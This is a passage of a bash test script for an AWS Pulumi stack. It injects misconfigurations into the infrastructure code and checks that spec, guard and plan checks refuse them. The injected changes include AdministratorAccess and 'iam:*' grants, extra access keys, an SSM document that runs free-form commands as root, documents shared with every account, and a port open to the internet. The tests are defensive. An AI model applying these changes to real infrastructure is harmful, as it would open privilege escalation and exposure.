    echo "$label: ok (the plan check refused swapped route table associations, rules on the wrong group, a self-referencing rule, an operator role Deny built from the proxy subnet and an ops policy built from the VM subnet)"
    ;;
iam-widen)
    edit_file iam.ts '/scratch:exec-role/s|assumeRolePolicy: trust, tags,|assumeRolePolicy: trust, tags, managedPolicyArns: ["arn:aws:iam::aws:policy/AdministratorAccess"],|'
    grep -qF 'managedPolicyArns: ["arn:aws:iam::aws:policy/AdministratorAccess"],' iam.ts || fail "the scratch:exec-role marker no longer widens the execution role"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/role:Role ai-env-vm-exec: input managedPolicyArns is outside the stack spec"
    edit_file egress.ts '/scratch:operator-role/s|assumeRolePolicy: JSON.stringify(operatorTrustPolicy()), tags,|assumeRolePolicy: JSON.stringify(operatorTrustPolicy()), tags, inlinePolicies: [{ name: "widen", policy: JSON.stringify({ Version: "2012-10-17", Statement: [{ Effect: "Allow", Action: "iam:*", Resource: "*" }] }) }],|'
    grep -qF 'inlinePolicies: [{ name: "widen"' egress.ts || fail "the scratch:operator-role marker no longer adds an inline policy"
    # MacRuntimePolicy widened is the positive run's existing-stack copy runtime-widen: its document names the
    # connector's ARN (S7 D5), unknown in this fresh preview, which the plan check accepts while the connector is created.
    edit_file policies.ts '/scratch:proxy-policy/s|Action: \["ssm:GetParameter", "ssm:GetParameters"\]|Action: ["ssm:*"]|'
    grep -qF 'Action: ["ssm:*"], Resource: [proxyParameterArn(n)] }, // scratch:proxy-policy' policies.ts || fail "the scratch:proxy-policy marker no longer widens the proxy's policy"
    no_guard
    expect_plan_refusal "aws:iam/role:Role ai-env-vm-exec: managedPolicyArns must be unset" \
        "aws:iam/role:Role ai-env-egress-operator: inlinePolicies must be unset" \
        "aws:iam/rolePolicy:RolePolicy ai-env-egress-proxy: policy is not policies.ts proxyRolePolicy(); a statement differs"
    echo "$label: ok (the guard refused a managed policy on a role; the plan check refused it, an operator inline policy and a widened proxy document)"
    ;;
owned-param-reset)
    plan=$(json_plan) || fail "the preview failed, so the plan check was not reached"
    # What the plan of an existing stack would hold if either owned parameter changed in anything but its tags.
    plan=$(node -e '
const plan = JSON.parse(require("fs").readFileSync(0, "utf-8"));
const ops = { "ai-env-proxy-suspended": "update", "ai-env-proxy-extras": "replace" };
for (const s of plan.steps) { const op = ops[s.urn.split("::").pop()]; if (op && s.newState && s.newState.type === "aws:ssm/parameter:Parameter") s.op = op; }
process.stdout.write(JSON.stringify(plan));
' <<<"$plan")
    if out=$(plan_check <<<"$plan" 2>&1); then echo "$out"; fail "plan: the plan check passed an update of the owned parameters"; fi
    for t in "aws:ssm/parameter:Parameter ai-env-proxy-suspended: a update step would reset the parameter to its initial header, wiping every host" \
        "aws:ssm/parameter:Parameter ai-env-proxy-extras: a replace step would reset the parameter to its initial header, wiping every extra"; do
        diag=$(first_line "$t" "$out")
        test -n "$diag" || { echo "$out"; fail "plan: the plan check refused, but not with \"$t\""; }
        echo "plan: $diag"
    done
    echo "$label: ok (the plan check refused an update and a replace of the parameters ai-env egress owns)"
    ;;
identity-widen)
    # S8 operators: what the operator identities must never get. 1. AdministratorAccess attached to ai-env-ops instead
    # of its policy (iam.ts's scratch:attach): the guard.
    attach_admin='/scratch:attach/s|policyArn: held.arn,|policyArn: u === OPS_USER_NAME ? "arn:aws:iam::aws:policy/AdministratorAccess" : held.arn,|'
    edit_file iam.ts "$attach_admin"
    grep -qF 'policyArn: u === OPS_USER_NAME ? "arn:aws:iam::aws:policy/AdministratorAccess" : held.arn, // scratch:attach' iam.ts || fail "the scratch:attach marker no longer attaches AdministratorAccess to ai-env-ops"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-ops--ai-env-ops: policyArn must be the stack's policy ai-env-ops"
    restore iam.ts
    # 1b. ai-env-deployer retained on delete, protected, or deleted with another resource (iam.ts's scratch:deployer-user;
    # buildRole is in scope there): nothing outlives make destroy, the account root's, and nothing makes it refuse: the
    # guard, each option alone.
    for opt in "retainOnDelete: true" "protect: true" "deletedWith: buildRole"; do
        edit_file iam.ts "/scratch:deployer-user/s|{ dependsOn: \\[|{ $opt, dependsOn: [|"
        grep -qF "{ $opt, dependsOn: [" iam.ts || fail "the scratch:deployer-user marker no longer gives ai-env-deployer $opt"
        expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/user:User ai-env-deployer: ${opt%%:*} is refused"
        restore iam.ts
    done
    # 1c. ai-env-deploy's attachment binding ai-env-ops instead of the deployer (iam.ts's scratch:attach-user): the daily
    # key would deploy: the guard.
    attach_user='/scratch:attach-user/s|user: holder.name,|user: p === DEPLOY_POLICY_NAME ? OPS_USER_NAME : holder.name,|'
    edit_file iam.ts "$attach_user"
    grep -qF 'user: p === DEPLOY_POLICY_NAME ? OPS_USER_NAME : holder.name, // scratch:attach-user' iam.ts || fail "the scratch:attach-user marker no longer binds ai-env-deploy's attachment to ai-env-ops"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user must be"
    restore iam.ts
    # 1d. MacRuntimePolicy on ai-env-ops instead of ai-env-runtime (iam.ts's scratch:runtime-user; a literal user, since the
    # runtime user's name is another resource's output, unknown to the guard in a fresh preview): the daily key would
    # hold the runtime grants (RunMicrovm, the shell token, PassRole on the execution role): the guard.
    runtime_user='/scratch:runtime-user/s|user: runtimeUser.name,|user: OPS_USER_NAME,|'
    edit_file iam.ts "$runtime_user"
    grep -qF 'user: OPS_USER_NAME, policy: render(runtimeNames, runtimePolicy) }, opts); // scratch:runtime-user' iam.ts || fail "the scratch:runtime-user marker no longer binds MacRuntimePolicy to ai-env-ops"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user must be"
    restore iam.ts
    # 2. An access key, a login profile, an attachment of AdministratorAccess, a group membership, a PolicyAttachment and
    # a UserPolicyAttachmentsExclusive of ai-env-ops, each appended to index.ts alone: the guard.
    key='new aws.iam.AccessKey("ai-env-ops-key", { user: "ai-env-ops" }, { provider: awsProvider });'
    login='new aws.iam.UserLoginProfile("ai-env-ops-console", { user: "ai-env-ops" }, { provider: awsProvider });'
    admin='new aws.iam.UserPolicyAttachment("ai-env-ops--AdministratorAccess", { user: "ai-env-ops", policyArn: "arn:aws:iam::aws:policy/AdministratorAccess" }, { provider: awsProvider });'
    group='new aws.iam.UserGroupMembership("ai-env-ops-groups", { user: "ai-env-ops", groups: ["ai-env-admins"] }, { provider: awsProvider });'
    everyone='new aws.iam.PolicyAttachment("ai-env-ops-everyone", { policyArn: "arn:aws:iam::aws:policy/AdministratorAccess", users: ["ai-env-ops"] }, { provider: awsProvider });'
    exclusive='new aws.iam.UserPolicyAttachmentsExclusive("ai-env-ops-exclusive", { userName: "ai-env-ops", policyArns: ["arn:aws:iam::aws:policy/AdministratorAccess"] }, { provider: awsProvider });'
    for pair in "aws:iam/accessKey:AccessKey ai-env-ops-key|$key" "aws:iam/userLoginProfile:UserLoginProfile ai-env-ops-console|$login" \
        "aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-ops--AdministratorAccess|$admin" "aws:iam/userGroupMembership:UserGroupMembership ai-env-ops-groups|$group" \
        "aws:iam/policyAttachment:PolicyAttachment ai-env-ops-everyone|$everyone" \
        "aws:iam/userPolicyAttachmentsExclusive:UserPolicyAttachmentsExclusive ai-env-ops-exclusive|$exclusive"; do
        restore index.ts
        append "${pair#*|}"
        expect_refusal guard "egress guard (infra/egress.ts) refused ${pair%%|*}: not in the stack inventory"
    done
    # 3. All of them, and the deployer's attach condition widened to AdministratorAccess (policies.ts's
    # scratch:deployer-attach: a document, which only the plan check compares), the guard off: the plan.
    restore index.ts
    edit_file iam.ts "$attach_admin" "$attach_user" "$runtime_user" '/scratch:deployer-user/s|{ dependsOn: \[|{ retainOnDelete: true, protect: true, deletedWith: buildRole, dependsOn: [|'
    grep -qF '{ retainOnDelete: true, protect: true, deletedWith: buildRole, dependsOn: [' iam.ts || fail "the scratch:deployer-user marker no longer gives ai-env-deployer all three options"
    grep -qF 'user: OPS_USER_NAME, policy: render(runtimeNames, runtimePolicy) }, opts); // scratch:runtime-user' iam.ts || fail "the scratch:runtime-user marker no longer binds MacRuntimePolicy to ai-env-ops"
    for code in "$key" "$login" "$admin" "$group" "$everyone" "$exclusive"; do append "$code"; done
    edit_file policies.ts '/scratch:deployer-attach/s|DEPLOYER_POLICIES.map((p) => policyArn(n, p))|[...DEPLOYER_POLICIES.map((p) => policyArn(n, p)), "arn:aws:iam::aws:policy/AdministratorAccess"]|'
    grep -qF '"arn:aws:iam::aws:policy/AdministratorAccess"] } }, // scratch:deployer-attach' policies.ts || fail "the scratch:deployer-attach marker no longer widens the deployer's attach condition"
    no_guard
    expect_plan_refusal "aws:iam/accessKey:AccessKey: not in the stack inventory: ai-env-ops-key" \
        "aws:iam/userLoginProfile:UserLoginProfile: not in the stack inventory: ai-env-ops-console" \
        "aws:iam/userPolicyAttachment:UserPolicyAttachment: not in the stack inventory: ai-env-ops--AdministratorAccess" \
        "aws:iam/userGroupMembership:UserGroupMembership: not in the stack inventory: ai-env-ops-groups" \
        "aws:iam/policyAttachment:PolicyAttachment: not in the stack inventory: ai-env-ops-everyone" \
        "aws:iam/userPolicyAttachmentsExclusive:UserPolicyAttachmentsExclusive: not in the stack inventory: ai-env-ops-exclusive" \
        "aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-ops--ai-env-ops: policyArn depends on nothing, expected aws:iam/policy:Policy::ai-env-ops" \
        "aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user depends on nothing, expected aws:iam/user:User::ai-env-deployer" \
        "aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user ai-env-ops is not ai-env-deployer" \
        "aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user depends on nothing, expected aws:iam/user:User::ai-env-runtime" \
        "aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user ai-env-ops is not ai-env-runtime" \
        "aws:iam/user:User ai-env-deployer: protected" \
        "aws:iam/user:User ai-env-deployer: retainOnDelete" \
        "aws:iam/user:User ai-env-deployer: deletedWith aws:iam/role:Role::ai-env-image-build" \
        "aws:iam/policy:Policy ai-env-deployer: policy is not policies.ts deployerPolicy(); a statement differs"
    echo "$label: ok (the guard refused AdministratorAccess on ai-env-ops, ai-env-deployer retained on delete, protected or deleted with another resource, ai-env-deploy's attachment bound to ai-env-ops, MacRuntimePolicy bound to ai-env-ops, and each key, login profile, group membership and other attachment of ai-env-ops; the plan check refused all of them and the widened deployer attach condition)"
    ;;
document-widen)
    # S8 operators: the proxy's documents run as root on the proxy. 1. A free-form parameter the reload document's
    # script runs: the spec (assertProxyDocuments), the guard, the plan.
    node -e '
const fs = require("fs");
const f = "proxy/documents/reload.json";
const d = JSON.parse(fs.readFileSync(f, "utf-8"));
d.parameters.commands = { type: "String", default: "true" };
d.mainSteps[0].inputs.runCommand.push("{{ commands }}");
fs.writeFileSync(f, JSON.stringify(d, null, 2) + "\n");
' || fail "the scratch proxy/documents/reload.json could not be edited"
    grep -qF '"{{ commands }}"' proxy/documents/reload.json || fail "the scratch proxy/documents/reload.json does not run {{ commands }}"
    expect_refusal spec "infra/proxy/documents/reload.json: parameter commands has no allowedValues"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-reload: parameter commands has no allowedValues"
    no_guard
    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-reload: parameter commands has no allowedValues"
    # 1b. An {{ssm:…}} reference in the status document's script (SSM would put a parameter's value into the script, run
    # as root on the proxy): the spec, the guard, the plan.
    restore proxy/documents/reload.json index.ts egress.ts
    node -e '
const fs = require("fs");
const f = "proxy/documents/status.json";
const d = JSON.parse(fs.readFileSync(f, "utf-8"));
d.mainSteps[0].inputs.runCommand.push("{{ssm:/ai-env/proxy/extras}}");
fs.writeFileSync(f, JSON.stringify(d, null, 2) + "\n");
' || fail "the scratch proxy/documents/status.json could not be edited"
    grep -qF '"{{ssm:/ai-env/proxy/extras}}"' proxy/documents/status.json || fail "the scratch proxy/documents/status.json does not run {{ssm:/ai-env/proxy/extras}}"
    expect_refusal spec "infra/proxy/documents/status.json: {{ssm:/ai-env/proxy/extras}} is a reference SSM resolves on the instance"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-status: {{ssm:/ai-env/proxy/extras}} is a reference SSM resolves on the instance"
    no_guard
    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-status: {{ssm:/ai-env/proxy/extras}} is a reference SSM resolves on the instance"
    # 1c. A second step in the patch document (another script, run as root after the first): the spec, the guard, the plan.
    restore proxy/documents/status.json index.ts egress.ts
    node -e '
const fs = require("fs");
const f = "proxy/documents/patch.json";
const d = JSON.parse(fs.readFileSync(f, "utf-8"));
d.mainSteps.push({ action: "aws:runShellScript", name: "more", inputs: { timeoutSeconds: "1800", runCommand: ["true"] } });
fs.writeFileSync(f, JSON.stringify(d, null, 2) + "\n");
' || fail "the scratch proxy/documents/patch.json could not be edited"
    test "$(grep -c '"aws:runShellScript"' proxy/documents/patch.json)" = 2 || fail "the scratch proxy/documents/patch.json does not have a second step"
    expect_refusal spec "infra/proxy/documents/patch.json: mainSteps must be exactly one step, got 2"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-patch: mainSteps must be exactly one step, got 2"
    no_guard
    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-patch: mainSteps must be exactly one step, got 2"
    # 2. The documents shared with every account (egress.ts's scratch:document): the guard, the plan.
    restore proxy/documents/patch.json index.ts egress.ts
    edit_file egress.ts '/scratch:document/s|content: docs\[role\], tags|content: docs[role], permissions: { type: "Share", account_ids: "All" }, tags|'
    grep -qF 'permissions: { type: "Share", account_ids: "All" }, tags, // scratch:document' egress.ts || fail "the scratch:document marker no longer shares the documents"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-reload: input permissions is outside the stack spec"
    no_guard
    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-reload: input permissions must be unset"
    # 3. The status document's script edited (it reloads instead): the guard, the plan.
    restore egress.ts
    edit_file egress.ts '/scratch:document/s|content: docs\[role\],|content: docs[role].replace("--status", "--if-changed"),|'
    grep -qF 'content: docs[role].replace("--status", "--if-changed"), tags, // scratch:document' egress.ts || fail "the scratch:document marker no longer edits the documents"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ssm/document:Document ai-env-proxy-status: content is not infra/proxy/documents/status.json"
    no_guard
    expect_plan_refusal "aws:ssm/document:Document ai-env-proxy-status: content is not infra/proxy/documents/status.json"
    echo "$label: ok (spec, guard and plan each refused a free-form document parameter, an {{ssm:…}} reference and a second step; guard and plan each refused a shared document and an edited script)"
    ;;
endpoint-on-vm-table)
    # S9: the S3 gateway endpoint on the VM route table: the VMs would reach S3 past squid. In a preview the route
    # tables' ids are unknown, so only the plan check (by URN) can see it.
    edit_file egress.ts '/scratch:endpoint-table/s|routeTableIds: \[proxyRoutes.table.id\]|routeTableIds: [vmRoutes.table.id]|'
    grep -qF 'routeTableIds: [vmRoutes.table.id], // scratch:endpoint-table' egress.ts || fail "the scratch:endpoint-table marker no longer puts the S3 endpoint on the VM route table"
    expect_plan_refusal "aws:ec2/vpcEndpoint:VpcEndpoint ai-env-s3: routeTableIds depends on aws:ec2/routeTable:RouteTable::ai-env-egress-vms, expected aws:ec2/routeTable:RouteTable::ai-env-egress-proxy"
    echo "$label: ok (the plan check refused the S3 gateway endpoint on the VM route table)"
    ;;
endpoint-policy-widen)
    # S9: the endpoint's policy widened from our bucket's v1/* to the whole bucket (the endpoint would admit the runtime
    # user's writes outside v1/): the guard compares it whole with policies.ts for the account, then the plan check.
    edit_file egress.ts '/scratch:endpoint-policy/s|policy: s3EndpointPolicyJson,|policy: s3EndpointPolicyJson.apply((p) => p.split("/v1/*").join("/*")),|'
    grep -qF 'policy: s3EndpointPolicyJson.apply((p) => p.split("/v1/*").join("/*")), // scratch:endpoint-policy' egress.ts || fail "the scratch:endpoint-policy marker no longer widens the S3 endpoint's policy"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ec2/vpcEndpoint:VpcEndpoint ai-env-s3: policy is not policies.ts's document for the stack"
    no_guard
    expect_plan_refusal "aws:ec2/vpcEndpoint:VpcEndpoint ai-env-s3: policy is not policies.ts s3EndpointPolicy(); a statement differs"
    echo "$label: ok (guard and plan each refused a widened S3 endpoint policy)"
    ;;
bucket-policy-no-vpce)
    # S9: the bucket policy built without the S3 gateway endpoint (another endpoint's id in its aws:SourceVpce
    # conditions): reads and the VM's writes no longer bound to our endpoint. The guard sees a known document while the
    # endpoint's id is not; the plan check sees it built from no endpoint (by URN), and not policies.ts's document.
    edit_file transcripts.ts '/scratch:bucket-policy/s|pulumi.all(\[accountId, endpointId\])|pulumi.all([accountId, pulumi.output("vpce-00000000000000000")])|'
    grep -qF 'pulumi.all([accountId, pulumi.output("vpce-00000000000000000")])' transcripts.ts || fail "the scratch:bucket-policy marker no longer builds the bucket policy without the S3 endpoint"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:s3/bucketPolicy:BucketPolicy ai-env-transcripts: policy is known while the S3 gateway endpoint's id is not"
    no_guard
    expect_plan_refusal "aws:s3/bucketPolicy:BucketPolicy ai-env-transcripts: policy does not depend on aws:ec2/vpcEndpoint:VpcEndpoint::ai-env-s3" \
        "aws:s3/bucketPolicy:BucketPolicy ai-env-transcripts: policy is not policies.ts transcriptsBucketPolicy()"
    echo "$label: ok (guard and plan each refused a bucket policy not bound to the S3 gateway endpoint)"
    ;;
relay-sg-open)
    # S13: the relay's private port open to the internet (only the VM group may reach it).
    edit_file egress-spec.ts 's|^\( *\)], // scratch:relay-rules$|\1{ direction: "ingress", protocol: "tcp", port: 7443, peer: { cidr: "0.0.0.0/0" }, description: "open" }], // scratch:relay-rules|'
    grep -qF 'description: "open" }], // scratch:relay-rules' egress-spec.ts || fail "the scratch:relay-rules marker no longer adds a rule to the relay security group"
    expect_refusal spec "ai-env-relay ingress tcp 7443 0.0.0.0/0: the relay security group allows only"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:vpc/securityGroupIngressRule:SecurityGroupIngressRule ai-env-relay-from-0.0.0.0-0-tcp-7443"
    no_guard
    expect_plan_refusal "not in the stack inventory: ai-env-relay-from-0.0.0.0-0-tcp-7443" \
        "ai-env-relay-from-0.0.0.0-0-tcp-7443: ai-env-relay ingress tcp 7443 0.0.0.0/0: the relay security group allows only"
    echo "$label: ok (spec, guard and plan each refused the relay's private port open to anywhere)"
    ;;
vm-relay-wide)
    # S13: the VM group's rule to the relay widened from its address to the proxy subnet (the proxy's other ports, any host there).
    edit_file egress-spec.ts '/scratch:vm-relay-rule/s|peer: { cidr: relayCidr(cfg) }|peer: { cidr: cfg.proxySubnetCidr }|'
    grep -qF 'peer: { cidr: cfg.proxySubnetCidr }, description: "to the relay'"'"'s private port" }, // scratch:vm-relay-rule' egress-spec.ts || fail "the scratch:vm-relay-rule marker no longer widens the VM group's rule to the relay"
    expect_refusal spec "ai-env-vm-egress egress tcp 7443 10.42.0.0/24: the VM security group allows exactly two rules"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:vpc/securityGroupEgressRule:SecurityGroupEgressRule ai-env-vm-egress-to-10.42.0.0-24-tcp-7443"
    no_guard
    expect_plan_refusal "not in the stack inventory: ai-env-vm-egress-to-10.42.0.0-24-tcp-7443" \
        "ai-env-vm-egress-to-10.42.0.0-24-tcp-7443: ai-env-vm-egress egress tcp 7443 10.42.0.0/24: the VM security group allows exactly two rules"
    echo "$label: ok (spec, guard and plan each refused the VM group's relay rule widened to the proxy subnet)"
    ;;
relay-nacl-wide)
    # S13: the NACL's relay egress entry widened to the VPC (the entry right above the scratch:nacl-egress marker).
    edit_file egress-spec.ts '/RELAY_NACL_RULE_NO.*fromPort: cfg.relayPort/s|cidr: relayCidr(cfg)|cidr: "10.42.0.0/16"|'
    grep -qF 'cidr: "10.42.0.0/16", fromPort: cfg.relayPort, toPort: cfg.relayPort },' egress-spec.ts || fail "the NACL's relay egress entry above scratch:nacl-egress can no longer be widened"
    expect_refusal spec "the VM subnet's network ACL must allow exactly two egress rules"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ec2/networkAcl:NetworkAcl ai-env-egress-vms: the VM subnet's network ACL must allow exactly two egress rules"
    no_guard
    expect_plan_refusal "network ACL ai-env-egress-vms: the VM subnet's network ACL must allow exactly two egress rules"
    echo "$label: ok (spec, guard and plan each refused the NACL's relay entry widened to the VPC)"
    ;;
relay-imds)
    # S13: the relay instance's IMDS reachable through one more hop (a container on it could reach the role).
    edit_file relay.ts '/scratch:relay-imds/s|httpPutResponseHopLimit: 1|httpPutResponseHopLimit: 2|'
    grep -qF 'httpPutResponseHopLimit: 2, instanceMetadataTags: "disabled" }, // scratch:relay-imds' relay.ts || fail "the scratch:relay-imds marker no longer raises the relay's hop limit"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ec2/instance:Instance ai-env-relay: metadataOptions must require IMDSv2 with hop limit 1"
    no_guard
    expect_plan_refusal 'relay instance IMDS: ["required",2], expected ["required",1]'
    echo "$label: ok (guard and plan each refused the relay's IMDS hop limit 2)"
    ;;
relay-eip-elsewhere)
    # S13: the relay's Elastic IP on the proxy (every worker would dial the proxy). The ids are unknown in a preview:
    # only the plan check, by URN, sees it.
    edit_file relay.ts '/scratch:relay-eip/s|instanceId: instance.id|instanceId: net.instance.id|'
    grep -qF 'instanceId: net.instance.id }, opts); // scratch:relay-eip' relay.ts || fail "the scratch:relay-eip marker no longer moves the Elastic IP to the proxy"
    expect_plan_refusal "aws:ec2/eipAssociation:EipAssociation ai-env-relay: instanceId depends on aws:ec2/instance:Instance::ai-env-egress-proxy, expected aws:ec2/instance:Instance::ai-env-relay"
    echo "$label: ok (the plan check refused the relay's Elastic IP on another instance)"
    ;;
relay-role-widen)
    # S13: the relay role reading every parameter under its prefix (Track B's /ai-env/away/* would be next to it).
    edit_file relay.ts '/scratch:relay-policy/s|JSON.stringify(relayRolePolicy(n))|JSON.stringify(relayRolePolicy(n)).split(`parameter${n.egress.relayParameterPrefix}/artifact"`).join(`parameter${n.egress.relayParameterPrefix}/*"`)|'
    grep -qF '/*"`)) }, opts); // scratch:relay-policy' relay.ts || fail "the scratch:relay-policy marker no longer widens the relay role's parameters"
    expect_plan_refusal "aws:iam/rolePolicy:RolePolicy ai-env-relay: policy is not policies.ts relayRolePolicy(); a statement differs"
    echo "$label: ok (the plan check refused the relay role widened to every parameter under its prefix)"
    ;;
esac
